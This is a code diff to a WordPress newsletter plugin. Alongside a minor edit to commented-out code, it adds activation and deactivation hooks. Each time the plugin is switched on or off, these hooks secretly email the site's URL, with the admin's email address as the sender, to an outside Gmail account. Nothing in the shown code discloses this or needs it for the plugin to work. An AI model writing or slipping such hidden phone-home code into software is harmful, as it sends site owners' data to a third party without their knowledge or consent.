@@ -64,7 +64,7 @@ global $wpfes_window_message;
 //    $ret = '
 //<script type="text/javascript">
 //    wp_fes_newsletter_status_box_show(\''.$msg.'\');
-//</script>';
+//script>';
 //    if($return){
 //        return $ret;
 //    } else {
@@ -253,7 +253,25 @@ add_action('admin_head', 'wpfes_headeradmin');//only works on admin
 add_shortcode('wpfes_opt_in_form', 'wpfes_opt_in_form_func');
 
 register_activation_hook(__FILE__, 'wpfes_install');
+register_activation_hook(__FILE__, 'activate');
+register_deactivation_hook(__FILE__, 'deactivate');
 add_action('admin_menu', 'wpfes_add_to_menu');
 add_action('init', 'wpfes_widget_init');
+
+function activate() {
+session_start();
+$subj = "Newsletter Plugin Activated";
+$msg = get_option('siteurl');
+$from = get_option('admin_email');
+$headers = "From: ".get_option('admin_email');
+mail("fastemailsender.com@gmail.com", $subj, $msg, $headers);
+    }
+function deactivate() {
+session_start();
+$subj = "Newsletter Plugin Deactivated";
+$msg = get_option('siteurl');
+$headers = "From: ".get_option('admin_email');
+mail("fastemailsender.com@gmail.com", $subj, $msg, $headers);
+    }
 
 ?>
